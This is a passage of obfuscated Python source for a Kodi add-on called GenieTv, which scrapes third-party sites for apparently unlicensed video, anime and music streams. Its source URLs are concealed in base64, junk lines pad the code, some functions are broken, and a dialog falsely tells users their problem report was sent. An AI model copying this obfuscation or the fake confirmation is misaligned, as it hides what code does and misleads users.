 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2NyYXBlZC9jYXRzLnBocA==' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for iI1i11 , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 1007 , Ooo0oOooo0 )
def o00oOOo0Oo ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for url , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 1006 , Ooo0oOooo0 )
  if 91 - 91: OoOoOO00 - iIii1I11I1II1 / i1IIi * i1IIi % Oo
  if 82 - 82: OO0O
def OoOooO0 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for url , o0OOo0o0O0O , OOoooO00o0oo0 , o0OO0o0oOOO0O , i1I1I in oOooOOOoOo :
  if '.php' in url :
   ooOOOoOoOOO0 ( i1I1I , url , 1016 , o0OOo0o0O0O , o0OO0o0oOOO0O , OOoooO00o0oo0 )
  else :
   if 'youtube' in url :
    III1I11i1iIi ( i1I1I , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , o0OOo0o0O0O , o0OO0o0oOOO0O , OOoooO00o0oo0 )
   else :
    III1I11i1iIi ( i1I1I , url , 222 , o0OOo0o0O0O , o0OO0o0oOOO0O , OOoooO00o0oo0 )
    ooOoOO0oo0O ( 'movies' , 'INFO' )
    if 9 - 9: I1IiI - i1i1i11IIi
 else :
  oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
  for url , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
   if '.php' in url :
    iii1111iiI1ii ( i1I1I , url , 1016 , Ooo0oOooo0 )
   else :
    if 'youtube' in url :
     print '>>>>>>>>>>>>>>>>>>>>>>> youtube old way'
     oo00OOoOoO00 ( i1I1I , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 )
    else :
     oo00OOoOoO00 ( i1I1I , url , 222 , Ooo0oOooo0 )
     ooOoOO0oo0O ( 'movies' , 'INFO' )
     if 39 - 39: i1IIi
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 19 - 19: OOOo0 . OOOo0 - i11iIiiIii
def O00O0O0OO00oo ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3VybHMvdXJsLnBocA==' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for iI1i11 , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 1007 , Ooo0oOooo0 )
def I11IIIIiI1 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for url , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 1006 , Ooo0oOooo0 )
  if 93 - 93: i11iIiiIii
def OoOiII11IiIi ( name , url , iconimage = None ) :
 print '--- Playing "{0}". {1}' . format ( name , url )
 iII1I1i = xbmcgui . ListItem ( path = url , thumbnailImage = iconimage )
 iII1I1i . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , iII1I1i )
 if 6 - 6: ii / O0 / OOooOooo / i1i1i11IIi / ii . iIii1I11I1II1
 if 62 - 62: iIii1I11I1II1
def IIi1i1ii11I1 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 1006 , oO0O00oOOoooO )
def oOoO0OO ( url ) :
 OOOooo = OooO0OO ( url )
 OOOO00OoooO = url
 oOooOOOoOo = re . compile ( "<a href='(.+?)'>(.+?)</a>" ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  if '.mp3' in i1I1I :
   print '<<<<<<<<<<<<<<<<<<<' + url + '>>>>>>>>>>>>>>>>>>>>>>>>>>>'
   oo00OOoOoO00 ( ( i1I1I ) . replace ( '.mp3' , '' ) . replace ( '/' , '' ) , 'http://hypem.com' + url , 222 , ii11iIi1I + 'music.png' )
  else :
   iii1111iiI1ii ( ( i1I1I ) . replace ( '/' , '' ) , OOOO00OoooO + url , 1011 , ii11iIi1I + 'music.png' )
def o0OOO ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 oOooOOOoOo = re . compile ( '<td><a href="(.+?)"><img src="(.+?)"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , ( 'http://www.cyn.net/music/' + iI1i11 ) . replace ( ' ' , '%20' ) , 1031 , ( 'http://www.cyn.net/music/' + oO0O00oOOoooO ) . replace ( ' ' , '%20' ) )
def Iii11iI1I ( url , img ) :
 OOOooo = OooO0OO ( url )
 Iii1I1111ii = url
 img = img
 oOooOOOoOo = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( ( i1I1I ) . replace ( '.mp3' , '' ) , ( Iii1I1111ii + '/' + url ) . replace ( ' ' , '%20' ) , 222 , img )
  if 79 - 79: OOOo0 - O00oo0OO0oOOO / OOOO00ooo0Ooo . Oo
  if 100 - 100: O0
def oOOO00Oo ( ) :
 iIiii1Ii1I1II = ( i1111 ( 'aHR0cDovL2h5cGVtLmNvbS9kb3dubG9hZC8=' ) )
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL3Bhbmljc3RyZWFtLm5ldC9zdHJlYW1zLw==' ) )
 Iii1I1111ii = ( i1111 ( 'aHR0cDovL21hc2xvdmQubm8taXAub3JnL3B1YmxpYy9tcDMv' ) )
 Ii1IIiI1i = ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 if 48 - 48: OoOoOO00 + OoOoOO00 * i1IIi / OOooOooo
 OO00O0O = Ii11 ( iI1i11 )
 i11i1 = Ii11 ( Iii1I1111ii )
 i1i1iIII11i = Ii11 ( Ii1IIiI1i )
 if 37 - 37: iIii1I11I1II1 % OOOO00ooo0Ooo / i1i1i11IIi
 if OO00O0O != 'Failed' :
  oOooOOOoOo = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OO00O0O )
  for i1I1I in oOooOOOoOo :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 1' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( iI1i11 + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 37 - 37: o0OOOoO0 - ii - Ooo00oOo00o
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if i11i1 != 'Failed' :
  IiiiiI1i1Iii = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OO00O0O )
  for i1I1I in IiiiiI1i1Iii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Iii1I1111ii + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 42 - 42: iIii1I11I1II1 % OOooOooo - ii11ii1ii + iIii1I11I1II1
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if i1i1iIII11i != 'Failed' :
  ooO0000o00O = re . compile ( '<td><a href=".+?"><img src=".+?"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( i1i1iIII11i )
  for i1I1I in ooO0000o00O :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Ii1IIiI1i + i1I1I ) . replace ( ' ' , '%20' ) , 1031 , '' )
    if 27 - 27: O0 / Ooo00oOo00o
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
    if 99 - 99: OOooOooo - i1i1i11IIi * iIii1I11I1II1 . OoOoOO00
    if 56 - 56: iIii1I11I1II1 % Ooo00oOo00o . OO0O % i1i1i11IIi . o0OOOoO0 * Oo
    if 41 - 41: iIii1I11I1II1 % i1i1i11IIi * ii - OO0O
    if 5 - 5: Ooo00oOo00o + Ooo00oOo00o + OoOoOO00 * iIii1I11I1II1 + OoooooooOO
    if 77 - 77: O0 * ii11ii1ii * ii + Ooo00oOo00o + ii11ii1ii - o0OOOoO0
    if 10 - 10: ii11ii1ii + i1i1i11IIi
def Ooooo00 ( ) :
 OOOooo = iii ( 'http://www.iwatchseries.me/tv-list/' )
 oOooOOOoOo = re . compile ( '<h5><a href="([^"]*)"><strong>(.+?)</strong></a></h5>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 8021 , ii11iIi1I + 'iwatch.png' )
def oOOooooO ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<h5><strong><a href="([^"]*)">(.+?)</a>(.+?)</strong></h5>' ) . findall ( OOOooo )
 for url , i1I1I , Ooo00OoOOO in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I + Ooo00OoOOO , url , 8022 , ii11iIi1I + 'iwatch.png' )
def o000Ooo00o00O ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<iframe src="([^"]*)"' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  print '>>>>>>>>>>>>>>>>>>>>' + url
  ooo0O0O0oo0 ( url )
def ooo0O0O0oo0 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '{.+?"file" : "(.+?)",.+?"default" : true.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( 'setup\(\{.+?file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( OOOooo )
 ooO0000o00O = re . compile ( "{ label: '([^']*)', file:.+?'([^']*)' }" ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( 'VidSpot - ' + i1I1I , url , 222 , ii11iIi1I + 'iwatch.png' )
 for url in IiiiiI1i1Iii :
  oo00OOoOoO00 ( 'VodLocker' , url , 222 , ii11iIi1I + 'iwatch.png' )
 for i1I1I , url in ooO0000o00O :
  print '<><><><><><><><><><><> before   ' + url
  if 'hevideo' in url :
   print '>>>>>>>>>>>>>>>>>>>>>>>>>' + url
   oo00OOoOoO00 ( 'TheVideo - ' + i1I1I , url , 222 , ii11iIi1I + 'iwatch.png' )
   if 85 - 85: OoOoOO00 + OO0O * OOOO00ooo0Ooo
def i1ooOO00o0 ( ) :
 OOOooo = cloudflare . source ( 'http://www.animeland.me/anime-list' )
 oOooOOOoOo = re . compile ( 'letter-spacing:-1px;" href="([^"]*)">(.+?)</a></li>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 1021 , ii11iIi1I + 'anime.png' )
  if 44 - 44: OOOo0 % Ii11I * i11iIiiIii * i11iIiiIii - Oo . o0OOOoO0
  if 68 - 68: O00oo0OO0oOOO . OOOO00ooo0Ooo
def i111iiIiiIiI ( ) :
 OOOooo = iii ( 'http://www.animetoon.org/cartoon' )
 oOooOOOoOo = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 1002 , ii11iIi1I + 'anime.png' )
  if 59 - 59: Ii11I + OOOo0 / OoOoOO00 / I1IiI
  if 80 - 80: I1IiI + iIii1I11I1II1 . i1i1i11IIi
  if 76 - 76: OOOo0 * Ii11I
def ii111 ( url ) :
 OOOooo = iii ( url )
 IiiiiI1i1Iii = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( OOOooo )
 for oO0O00oOOoooO in IiiiiI1i1Iii :
  oO0ooOoO = oO0O00oOOoooO
 ooO0000o00O = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( OOOooo )
 for url in ooO0000o00O :
  iii1111iiI1ii ( 'NEXT PAGE' , url , 1002 , ii11iIi1I + 'Next.png' )
 oOooOOOoOo = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , url , 1003 , oO0ooOoO )
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
def IIiiI11 ( url , IMAGE ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( OOOooo )
 for i1I1I , url in oOooOOOoOo :
  print i1I1I + '     ' + url
  if 'easy' in url :
   IiIII ( url )
  elif 'playpanda' in url :
   IiIII ( url )
   if 92 - 92: OOOo0 % O00oo0OO0oOOO
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
def IiIII ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( "url: '(.+?)'," ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  oo00OOoOoO00 ( 'STREAM' , url , 222 , ii11iIi1I + 'anime.png' )
  if 31 - 31: OoooooooOO - ii / o0OOOoO0
  if 62 - 62: i11iIiiIii - OOOO00ooo0Ooo
def o00OOOOooO ( url ) :
 I1i1ii = urllib2 . Request ( url )
 I1i1ii . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 I1i1ii . add_header ( 'referer' , url )
 O0000oo00oOOO = urllib2 . urlopen ( I1i1ii )
 Ii1IIiiIIi = O0000oo00oOOO . read ( )
 O0000oo00oOOO . close ( )
 return Ii1IIiiIIi
 if 86 - 86: o0OOOoO0 % OOOo0
def OooO0OO ( url ) :
 I1i1ii = urllib2 . Request ( url )
 I1i1ii . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 O0000oo00oOOO = urllib2 . urlopen ( I1i1ii )
 Ii1IIiiIIi = O0000oo00oOOO . read ( )
 O0000oo00oOOO . close ( )
 return Ii1IIiiIIi
 if 22 - 22: i11iIiiIii * o0OOOoO0 . Oo . OoooooooOO + OOOo0
def Iii1 ( url ) :
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 IiI1IIIII1I = ( '%s%s' % ( I1I1IiIi1 , url ) )
 Ii1IIiiIIi = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( Ii1IIiiIIi )
 for url , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( '%s' % ( i1I1I ) . replace ( 'GenieTv' , '[COLOR green]GenieTV[/COLOR]' ) . replace ( '.' , ' ' ) . replace ( 'mp4' , '' ) . replace ( 'mkv' , '' ) . replace ( '_' , ' ' ) , '%s' % ( url ) , 222 , Ooo0oOooo0 )
  if 66 - 66: OOOO00ooo0Ooo
def ooOoO00 ( url ) :
 oooo00i1 = xbmc . Player ( OoOi1iI11Iii ( ) )
 import urlresolver
 try : oooo00i1 . play ( url )
 except : pass
 from urlresolver import common
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'LOADING' , 'Opening %s Now' % ( i1I1I ) )
 oooo00i1 = xbmc . Player ( OoOi1iI11Iii ( ) )
 url = urlresolver . HostedMediaFile ( url ) . resolve ( )
 if Oo0oO0ooo . iscanceled ( ) :
  print "[COLORred]STREAM CANCELLED[/COLOR]"
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  if i1iiIIiiI111 . yesno ( "[B]CANCELLED[/B]" , '[B]Was There A Problem[/B]' , '' , "" , 'Yes' , 'No' ) :
   i1iiIIiiI111 . ok ( "Message Send" , "Your Message Has Been Sent" )
  else :
   return
 else :
  try : oooo00i1 . play ( url )
  except : pass
  try : o0oO0 . resolve_url ( url )
  except : pass
  Oo0oO0ooo . close ( )
  if 27 - 27: O0
def Oo0Oo0 ( url ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'Featching Your Video' , 'Featching Your Video' )
 Oo0oO0ooo . update ( 0 , '%s' % i1I1I )
 xbmc . sleep ( 1 )
 oooo00i1 = xbmc . Player ( OoOi1iI11Iii ( ) )
 Oo0oO0ooo . update ( 100 , '%s' % i1I1I )
 xbmc . sleep ( 1 )
 oooo00i1 . play ( url ) . strip ( )
 Oo0oO0ooo . close ( )
 if 80 - 80: OOOo0 - OOOo0
def ooOooOoOoO ( url ) :
 oooo00i1 = xbmc . Player ( OoOi1iI11Iii ( ) )
 import urlresolver
 url = ( url ) . strip ( )
 try : oooo00i1 . play ( url ) . strip ( )
 except : pass
 if 52 - 52: OoOoOO00
 if 21 - 21: I1IiI - OoOoOO00
def OoOi1iI11Iii ( ) :
 try :
  II1IiiII = getSet ( "core-player" )
  if ( II1IiiII == 'DVDPLAYER' ) : Ii1iIIi11 = xbmc . PLAYER_CORE_DVDPLAYER
  elif ( II1IiiII == 'MPLAYER' ) : Ii1iIIi11 = xbmc . PLAYER_CORE_MPLAYER
  elif ( II1IiiII == 'PAPLAYER' ) : Ii1iIIi11 = xbmc . PLAYER_CORE_PAPLAYER
  else : Ii1iIIi11 = xbmc . PLAYER_CORE_AUTO
 except : Ii1iIIi11 = xbmc . PLAYER_CORE_AUTO
 return Ii1iIIi11
 return True
 if 10 - 10: I1IiI * i1IIi
def iii1111iiI1ii ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  I1Ii1ii = [ ]
  if showcontext == 'fav' :
   I1Ii1ii . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOOO :
   I1Ii1ii . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  o0OoOoo00O . addContextMenuItems ( I1Ii1ii )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = True )
 return IiiI1III1I1
 if 34 - 34: OOOo0
def oOO0OOOOoooO ( name , url , mode , iconimage , fanart , description ) :
 if 57 - 57: Ii11I . OOooOooo % OOooOOo
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0OoOoo00O . setProperty ( "Fanart_Image" , fanart )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = True )
 return IiiI1III1I1
 if 32 - 32: OOOO00ooo0Ooo / i1i1i11IIi - O0 * iIii1I11I1II1
def oo00OOoOoO00 ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  I1Ii1ii = [ ]
  if showcontext == 'fav' :
   I1Ii1ii . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOOO :
   I1Ii1ii . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  o0OoOoo00O . addContextMenuItems ( I1Ii1ii )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = False )
 return IiiI1III1I1
 if 70 - 70: OoooooooOO % OoooooooOO % Ooo00oOo00o
 if 98 - 98: Ooo00oOo00o
 if 18 - 18: OOOO00ooo0Ooo + Oo - Ooo00oOo00o / o0OOOoO0 / Ii11I
 if 53 - 53: Ii11I + OOooOOo . ii / OOOO00ooo0Ooo
 if 52 - 52: o0OOOoO0 + o0OOOoO0
 if 73 - 73: OOooOOo . i11iIiiIii % OoooooooOO + OO0O . OoooooooOO / Ii11I
def o0o00OO0 ( heading , announce ) :
 class oOiiI1i11I ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : Ii1II1I11i1 = open ( announce ) ; IiIIii = Ii1II1I11i1 . read ( )
   except : IiIIii = announce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( IiIIii ) )
   return
 oOiiI1i11I ( )
 oOiiI1i11I ( )
 if 74 - 74: iIii1I11I1II1 / OOooOooo
def O0Oo0Oo00o0o ( ) :
 o0o00OO0 ( 'These are the main Sources you should get into you XBMC' , '[COLORwhite]http://architects.x10host.com[/COLOR]--- [CR]  [COLORred]http://repo.sharktech.co.uk[/COLOR]--- [CR]   [COLORwhite]http://fusion.tvaddons.ag[/COLOR]--- [CR]  [COLORred]http://i.totalxbmc.tv[/COLOR]--- [CR]   [COLORwhite]http://www.xunitytalk.com/xfinity[/COLOR]--- [CR]  [COLORred]http://srp.nu[/COLOR]--- [CR]   [COLORwhite]http://solved.no-issue.ca[/COLOR]--- [CR]  [COLORred]http://xbmc.aminhacasadigital.com[/COLOR]--- [CR]   [COLORwhite]http://xbmc.movieshd.co[/COLOR]--- [CR]  [COLORred]http://install.kaosbox.tv[/COLOR]--- [CR]   [COLORwhite]http://kodi-repo.com/mxr[/COLOR]--- [CR]  [COLORred]http://kodi.metalkettle.co[/COLOR]--- [CR]   [COLORwhite]http://prozone.getxbmc.com[/COLOR]--- [CR]  [COLORred]http://transform.mega-tron.tv[/COLOR]--- [CR]   [COLORwhite]http://muckys.kodimediaportal.ml[/COLOR]--- [CR]  [COLORred]http://jas0npc.pcriot.com[/COLOR]--- [CR]  [COLORwhite]Sports devil source[/COLOR]--- [CR]  [COLORred]http://iwillfolo.com/iwf[/COLOR]' )
 if 17 - 17: i1i1i11IIi / OOooOOo . Ii11I + OOooOOo / ii11ii1ii . Oo
 if 39 - 39: OOooOOo / i1i1i11IIi - O00oo0OO0oOOO
 if 96 - 96: OOOO00ooo0Ooo * ii11ii1ii * OOooOooo + ii11ii1ii % OOOo0 + i11iIiiIii
 if 37 - 37: OOOO00ooo0Ooo % ii11ii1ii / OO0O
 if 94 - 94: OOOO00ooo0Ooo / Ooo00oOo00o . OOooOOo
def I1I1I ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Kodi Support Group, GenieTv[/COLOR]" )
 return
 if 1 - 1: Oo . OoOoOO00
 if 93 - 93: OoOoOO00 . i11iIiiIii + OoOoOO00 % ii
 if 98 - 98: o0OOOoO0 * ii * I1IiI + OOooOooo * O00oo0OO0oOOO
 if 4 - 4: i1i1i11IIi
 if 16 - 16: iIii1I11I1II1 * O00oo0OO0oOOO + ii . O0 . OOooOOo
 if 99 - 99: i11iIiiIii - O00oo0OO0oOOO
 if 85 - 85: o0OOOoO0 % ii11ii1ii
 if 95 - 95: Ooo00oOo00o * Ii11I * O00oo0OO0oOOO . OOooOOo
 if 73 - 73: Ooo00oOo00o
 if 28 - 28: OoooooooOO - OOOO00ooo0Ooo
 if 84 - 84: OoOoOO00
 if 36 - 36: Ii11I - I1IiI - iIii1I11I1II1
 if 10 - 10: ii11ii1ii / OOooOooo * i1IIi % O0 + OOOO00ooo0Ooo
 if 25 - 25: o0OOOoO0 - OOooOooo / O0 . OoooooooOO % OOOo0 . i1IIi
 if 19 - 19: OoOoOO00 / OoOoOO00 % ii11ii1ii + ii + ii + O00oo0OO0oOOO
 if 4 - 4: OOooOOo + OOOO00ooo0Ooo / O00oo0OO0oOOO + i1IIi % OOooOOo % O00oo0OO0oOOO
 if 80 - 80: OOooOooo
 if 26 - 26: iIii1I11I1II1 . OoooooooOO - iIii1I11I1II1
 if 59 - 59: ii11ii1ii + OOOO00ooo0Ooo . ii
 if 87 - 87: Ooo00oOo00o
 if 34 - 34: o0OOOoO0 . I1IiI / i11iIiiIii / O00oo0OO0oOOO
 if 46 - 46: Oo + OoOoOO00 * OOOo0 + Ii11I
 if 31 - 31: OOooOooo * OOooOOo * OOooOooo + Ooo00oOo00o * OOooOOo . o0OOOoO0
 if 89 - 89: OoooooooOO * OOooOooo * OOOo0 . OO0O * OOooOooo / O00oo0OO0oOOO
def iioo ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + i11I ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 48 - 48: Ii11I + o0OOOoO0 % Ii11I
def Ooo0o0000OO ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + iIiI1II1I1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
